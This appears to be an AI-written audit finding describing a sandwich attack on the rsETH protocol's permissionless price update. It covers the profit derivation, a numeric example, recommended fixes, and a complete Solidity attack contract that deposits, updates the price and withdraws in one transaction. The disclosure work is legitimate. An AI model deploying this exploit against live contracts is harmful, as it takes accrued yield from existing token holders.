I need to trace the full attack path through the math before rendering a verdict.

### Title
Sandwich Attack on `updateRSETHPrice` Steals Accrued Yield from Existing rsETH Holders via Stale-Price Deposit + Instant Withdrawal — (`contracts/LRTOracle.sol`, `contracts/LRTDepositPool.sol`, `contracts/LRTWithdrawalManager.sol`)

---

### Summary

`updateRSETHPrice()` is a permissionless public function. `depositETH` mints rsETH at the stored (stale) `rsETHPrice`, and `instantWithdrawal` redeems at the current (post-update) `rsETHPrice`. An attacker can atomically: (1) deposit ETH at the stale lower price, (2) call `updateRSETHPrice()` to push the price up and mint protocol-fee rsETH, then (3) instantly withdraw at the new higher price. The attacker captures a portion of the yield that should have accrued to existing holders.

---

### Finding Description

**Deposit minting uses the stored stale price:**

`getRsETHAmountToMint` divides by `lrtOracle.rsETHPrice()` — the last stored value, not a freshly computed one. [1](#0-0) 

If yield has accrued since the last price update, `rsETHPrice` is lower than the true TVL/supply ratio, so the depositor receives more rsETH than fair value.

**`updateRSETHPrice()` is public and permissionless:** [2](#0-1) 

Any EOA or contract can call it. The function computes `previousTVL = rsethSupply * rsETHPrice` (line 234), meaning the attacker's freshly minted rsETH is included in `rsethSupply` at the stale price, so `previousTVL` increases by exactly `X` (the deposited ETH). The yield calculation is therefore **unaffected** by the attacker's deposit:

```
rewardAmount = totalETHInProtocol - previousTVL
             = (T + X) - (S·P_old + X)
             = T - S·P_old
             = Y   (unchanged)
``` [3](#0-2) 

The new price is set to `(totalETHInProtocol - protocolFeeInETH) / rsethSupply`, which is higher than `P_old` whenever `Y > 0`. [4](#0-3) 

**`instantWithdrawal` redeems at the new higher price:** [5](#0-4) 

`getExpectedAssetAmount` uses `lrtOracle.rsETHPrice()` — now the freshly updated higher value — to compute ETH out. [6](#0-5) 

**Arithmetic proof of profit:**

Let:
- `T` = current TVL, `S` = rsETH supply, `P_old` = stale stored price
- `Y` = accrued yield = `T − S·P_old`
- `φ` = protocol fee rate, `f` = instant withdrawal fee rate

Attacker deposits `X` ETH → receives `X/P_old` rsETH.

After `updateRSETHPrice`:
```
P_new = (T + X − Y·φ) / (S + X/P_old)
```

Attacker burns `X/P_old` rsETH, receives:
```
ETH_out = (X/P_old) · P_new · (1 − f)
        = X · (1 + Y·(1−φ)/(S·P_old + X)) · (1 − f)
```

Net profit = `ETH_out − X > 0` whenever `Y·(1−φ)/TVL > f`, i.e., the net yield rate exceeds the instant withdrawal fee rate.

**Concrete example:**
- TVL = 100,000 ETH, S = 95,238 rsETH, P_old = 1.05 ETH/rsETH
- Yield Y = 1,000 ETH (1%), protocol fee φ = 10%, instant withdrawal fee f = 0.5%
- Attacker deposits X = 10,000 ETH → gets 9,523.81 rsETH
- `P_new` = (111,000 − 100) / 104,761.81 ≈ 1.05861 ETH/rsETH
- ETH out after 0.5% fee = 9,523.81 × 1.05861 × 0.995 ≈ **10,031.6 ETH**
- **Net profit ≈ 31.6 ETH** on a 10,000 ETH deposit

The price increase here is ~0.82%, within a typical 1% `pricePercentageLimit`, so the attacker can call `updateRSETHPrice()` themselves without manager role.

**`pricePercentageLimit` guard analysis:**

The guard reverts non-manager callers only when `newRsETHPrice − highestRsethPrice > pricePercentageLimit · highestRsethPrice`. [7](#0-6) 

Crucially, the attacker's large deposit **dilutes** the yield across more rsETH tokens, which **reduces** the computed price increase, making it more likely to pass the threshold check. The attacker can tune `X` to stay just under the limit. If `pricePercentageLimit = 0`, there is no limit at all.

**Instant withdrawal availability constraint:**

The ETH redeemed comes from `LRTUnstakingVault`, gated by `getAssetsAvailableForInstantWithdrawal`: [8](#0-7) 

This is a real constraint — the vault must hold ETH beyond the `queuedWithdrawalsBuffer`. However, in normal operation the vault accumulates ETH from EigenLayer unstaking, and operators set the buffer. When instant withdrawal is enabled, excess ETH is expected to be available.

---

### Impact Explanation

The attacker extracts a portion of the yield that should have accrued to existing rsETH holders. Existing holders' rsETH is worth less post-attack than it would have been without the attack, because the yield is diluted across the attacker's rsETH tokens before being captured via instant withdrawal. This is **theft of unclaimed yield** — the principal of existing holders is not directly reduced, but their earned appreciation is stolen.

**Impact: High. Theft of unclaimed yield.**

---

### Likelihood Explanation

Preconditions:
1. `isInstantWithdrawalEnabled[ETH]` is `true` — operator-configurable, intended for production use
2. `LRTUnstakingVault` holds ETH beyond `queuedWithdrawalsBuffer` — normal operational state when ETH has been unstaked from EigenLayer
3. Yield has accrued since the last price update — happens continuously
4. Net yield rate > instant withdrawal fee rate — true whenever `instantWithdrawalFee` is low (e.g., 0–50 bps) and yield is meaningful

The attack is executable in a single atomic transaction via a smart contract. No front-running, no privileged role, no oracle manipulation required. The attacker can repeat it every time yield accrues within the price threshold.

**Likelihood: Medium** (requires instant withdrawal to be enabled and ETH in the vault, but these are intended production states).

---

### Recommendation

1. **Snapshot rsETHPrice at deposit time and use it for withdrawal too** — or, more practically, require that `updateRSETHPrice()` was called in the same block before any deposit is accepted (a freshness check).
2. **Alternatively, update the price inside `depositETH`** before computing `rsethAmountToMint`, so deposits always use the current TVL/supply ratio.
3. **Add a minimum holding period** before rsETH minted via `depositETH` can be used in `instantWithdrawal` (e.g., require `block.number > mintBlock + N`).
4. **Increase `instantWithdrawalFee`** to exceed the maximum possible per-update yield rate, making the sandwich unprofitable. However, this is a blunt instrument.

The root cause is the combination of: (a) a permissionless price-update function that increases the price, (b) minting at the pre-update stale price, and (c) an immediate redemption path at the post-update price. Any fix must break at least one of these three links.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface IDepositPool {
    function depositETH(uint256 minRSETH, string calldata ref) external payable;
}
interface IOracle {
    function updateRSETHPrice() external;
}
interface IRSETH {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
}
interface IWithdrawalManager {
    function instantWithdrawal(address asset, uint256 rsETH, string calldata ref) external;
}

contract SandwichAttack {
    address constant ETH_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    IDepositPool  depositPool;
    IOracle       oracle;
    IRSETH        rsETH;
    IWithdrawalManager withdrawalMgr;

    constructor(address dp, address o, address r, address wm) {
        depositPool    = IDepositPool(dp);
        oracle         = IOracle(o);
        rsETH          = IRSETH(r);
        withdrawalMgr  = IWithdrawalManager(wm);
    }

    function attack() external payable {
        uint256 ethIn = msg.value;

        // Step 1: deposit at stale (lower) rsETHPrice
        depositPool.depositETH{value: ethIn}(0, "");

        // Step 2: trigger price update — permissionless, pushes price up
        oracle.updateRSETHPrice();

        // Step 3: instant withdrawal at new (higher) rsETHPrice
        uint256 rsETHBal = rsETH.balanceOf(address(this));
        rsETH.approve(address(withdrawalMgr), rsETHBal);
        withdrawalMgr.instantWithdrawal(ETH_TOKEN, rsETHBal, "");

        // Profit: address(this).balance > ethIn
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

**Fork test setup (Foundry):**
```solidity
// Fork mainnet at a block where yield has accrued since last updateRSETHPrice
// Verify: attacker.balance after attack > attacker.balance before attack
// Measure: ETH_out - ETH_in across the three-step sequence
// Vary X (deposit size) to show profit scales with deposit amount
// Confirm rewardAmount in updateRSETHPrice equals Y regardless of X
```

### Citations

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L244-313)
```text
        if (!protocolPaused && totalETHInProtocol > previousTVL) {
            uint256 rewardAmount = totalETHInProtocol - previousTVL;
            protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
        }

        // compute new rsETH price based on total ETH minus fee
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);

        if (newRsETHPrice > highestRsethPrice) {
            // check if the price is above the threshold
            uint256 priceDifference = newRsETHPrice - highestRsethPrice;
            // pricePercentageLimit is in 1e18 precision (100% = 1e18, 1% = 1e16)
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
        }

        // downside protection — pause if price drops too far
        if (newRsETHPrice < highestRsethPrice) {
            uint256 diff = highestRsethPrice - newRsETHPrice;
            // normalizing to 1e18
            bool isPriceDecreaseOffLimit =
                pricePercentageLimit > 0 && diff > pricePercentageLimit.mulWad(highestRsethPrice);

            // if price decrease is off limit, pause the protocol (unless it's already paused)
            if (isPriceDecreaseOffLimit) {
                if (!lrtDepositPool.paused()) lrtDepositPool.pause();
                if (!withdrawalManager.paused()) withdrawalManager.pause();
                _pause();
                return;
            }

            // if price has decreased compared to the previous price, emit an event to reflect that
            if (previousPrice > newRsETHPrice) {
                emit RsETHPriceDecrease(newRsETHPrice, previousPrice);
            }

            // emit an event to notify that the price is currently below the peak (all time high) price
            emit RsETHPriceBelowPeak(highestRsethPrice, newRsETHPrice);
        }

        // update highest price if new price exceeds it
        if (newRsETHPrice > highestRsethPrice) {
            highestRsethPrice = newRsETHPrice;
        }

        // mint protocol fee as rsETH if there's a fee to take
        if (protocolFeeInETH > 0) {
            // Calculate rsETH amount to mint as protocol fee
            uint256 rsethAmountToMintAsProtocolFee = protocolFeeInETH.divWad(newRsETHPrice);

            _checkAndUpdateDailyFeeMintLimit(rsethAmountToMintAsProtocolFee);
            if (rsethAmountToMintAsProtocolFee > 0) {
                address treasury = lrtConfig.getContract(LRTConstants.PROTOCOL_TREASURY);
                IRSETH(rsETHTokenAddress).mint(treasury, rsethAmountToMintAsProtocolFee);
                emit FeeMinted(treasury, rsethAmountToMintAsProtocolFee);
            }
        } else {
            _checkAndUpdateDailyFeeMintLimit(0);
        }

        rsETHPrice = newRsETHPrice;
```

**File:** contracts/LRTWithdrawalManager.sol (L228-229)
```text
        uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
        IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
```

**File:** contracts/LRTWithdrawalManager.sol (L590-594)
```text
        ILRTOracle lrtOracle = ILRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE));

        // calculate underlying asset amount to receive based on rsETH amount and asset exchange rate
        underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
    }
```

**File:** contracts/LRTUnstakingVault.sol (L229-238)
```text
    function getAssetsAvailableForInstantWithdrawal(address asset)
        external
        view
        onlySupportedAsset(asset)
        returns (uint256 availableAmount)
    {
        uint256 vaultBalance = balanceOf(asset);
        uint256 reservedBuffer = queuedWithdrawalsBuffer[asset];
        availableAmount = reservedBuffer >= vaultBalance ? 0 : vaultBalance - reservedBuffer;
    }
```
